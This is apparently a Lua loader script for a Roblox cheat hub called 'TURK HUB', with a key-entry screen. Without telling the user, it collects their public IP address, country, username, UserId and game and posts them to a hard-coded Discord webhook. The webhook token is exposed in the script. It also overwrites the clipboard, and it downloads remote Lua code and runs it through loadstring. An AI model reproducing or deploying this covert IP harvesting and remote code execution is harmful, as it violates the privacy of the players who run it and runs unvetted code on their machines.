if getgenv().TURKHUB_LOADED then return end
getgenv().TURKHUB_LOADED = true

if not game:IsLoaded() then
    game.Loaded:Wait()
end

-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local LocalPlayer = Players.LocalPlayer

-- LINKS
local DiscordInvite = "https://discord.com/invite/v3dAeMKp4N"
local KeyURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/KEY"
local LoaderURL = "https://raw.githubusercontent.com/TURK2/HubScript/main/Run/Loader.lua"

-- WEBHOOK
local AnalyticsWebhook = "https://discord.com/api/webhooks/1479493583118794904/W8wKs11ip0OtUHLLtEviLxw-3OTTShXcNhn9NZPWiBSWfms5MD-_K10wF36iYxDL6YBa"

-- COUNTER API
local OnlineCounter = "https://api.countapi.xyz/hit/turkhub/online"
local TodayCounter = "https://api.countapi.xyz/hit/turkhub/today"
local TotalCounter = "https://api.countapi.xyz/hit/turkhub/total"
local GameCounter = "https://api.countapi.xyz/hit/turkhub/game_"

-- Whitelist
local WhitelistPlayers = {
    "maytawin29",
    "maytawin_test"
}

-- request
local request = syn and syn.request or http_request or request

-- copy discord
pcall(function()
    setclipboard(DiscordInvite)
end)

-- get ip
local function GetIP()
    local ip = "Unknown"
    pcall(function()
        ip = game:HttpGet("https://api.ipify.org")
    end)
    return ip
end

-- get country
local function GetCountry()

    local country = "Unknown"

    pcall(function()

        local data = game:HttpGet("http://ip-api.com/json")
        local decoded = HttpService:JSONDecode(data)

        country = decoded.country

    end)

    return country

end

-- game name
local function GetGameName()

    local name = "Unknown"

    pcall(function()
        name = MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)

    return name

end

-- counter helper
local function HitCounter(url)

    local value = "0"

    pcall(function()

        local data = game:HttpGet(url)
        local decoded = HttpService:JSONDecode(data)

        value = tostring(decoded.value)

    end)

    return value

end

-- analytics send
local function SendAnalytics()

    if not request then return end

    local ip = GetIP()
    local country = GetCountry()
    local gameName = GetGameName()

    local online = HitCounter(OnlineCounter)
    local today = HitCounter(TodayCounter)
    local total = HitCounter(TotalCounter)

    -- game counter
    local gameCount = HitCounter(GameCounter..game.PlaceId)

    local data = {
        ["embeds"] = {{
            ["title"] = "🚀 TURK HUB EXECUTED",
            ["color"] = 65280,
            ["fields"] = {

                {
                    ["name"] = "👤 Player",
                    ["value"] = LocalPlayer.Name,
                    ["inline"] = true
                },

                {
                    ["name"] = "🆔 UserId",
                    ["value"] = tostring(LocalPlayer.UserId),
                    ["inline"] = true
                },

                {
                    ["name"] = "🌍 Country",
                    ["value"] = country,
                    ["inline"] = true
                },

                {
                    ["name"] = "🎮 Game",
                    ["value"] = gameName,
                    ["inline"] = false
                },

                {
                    ["name"] = "📌 PlaceId",
                    ["value"] = tostring(game.PlaceId),
                    ["inline"] = false
                },

                {
                    ["name"] = "🌐 IP",
                    ["value"] = ip,
                    ["inline"] = false
                },

                {
                    ["name"] = "👥 Online Users",
                    ["value"] = online,
                    ["inline"] = true
                },

                {
                    ["name"] = "📅 Users Today",
                    ["value"] = today,
                    ["inline"] = true
                },

                {
                    ["name"] = "📊 Total Users",
                    ["value"] = total,
                    ["inline"] = true
                },

                {
                    ["name"] = "🔥 Game Hub Uses",
                    ["value"] = gameCount,
                    ["inline"] = false
                }

            },

            ["footer"] = {
                ["text"] = "TURK HUB Analytics System"
            }

        }}
    }

    request({
        Url = AnalyticsWebhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = HttpService:JSONEncode(data)
    })

end

pcall(SendAnalytics)

-- whitelist bypass
for _,name in pairs(WhitelistPlayers) do
    if LocalPlayer.Name == name then
        loadstring(game:HttpGet(LoaderURL))()
        return
    end
end

-- UI
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local function GetKeys()

    local data = ""
    pcall(function()
        data = game:HttpGet(KeyURL)
    end)

    local keys = {}

    for line in string.gmatch(data,"[^\r\n]+") do
        table.insert(keys,line)
    end

    return keys
end

local ValidKeys = GetKeys()

local Window = Rayfield:CreateWindow({
    Name = "TURK HUB | Key System",
    LoadingTitle = "TURK HUB",
    LoadingSubtitle = "Secure Loader",
    Theme = "DarkBlue"
})

local KeyTab = Window:CreateTab("Authentication","lock")

local UserKey = ""

KeyTab:CreateInput({
    Name = "Enter Key",
    PlaceholderText = "Paste your key here",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        UserKey = Text
    end
})

KeyTab:CreateButton({
    Name = "Submit Key",
    Callback = function()

        local Valid = false

        for _,k in pairs(ValidKeys) do
            if UserKey == k then
                Valid = true
                break
            end
        end

        if Valid then

            Rayfield:Notify({
                Title = "Access Granted",
                Content = "Loading Hub...",
                Duration = 4
            })

            wait(1)

            loadstring(game:HttpGet(LoaderURL))()

            Rayfield:Destroy()

        else

            pcall(function()
                setclipboard(DiscordInvite)
            end)

            Rayfield:Notify({
                Title = "Invalid Key",
                Content = "Join our Discord to get key (copied)",
                Duration = 5
            })

        end

    end
})

KeyTab:CreateButton({
    Name = "Copy Discord Invite",
    Callback = function()

        pcall(function()
            setclipboard(DiscordInvite)
        end)

        Rayfield:Notify({
            Title = "Copied",
            Content = "Discord link copied",
            Duration = 3
        })

    end
})
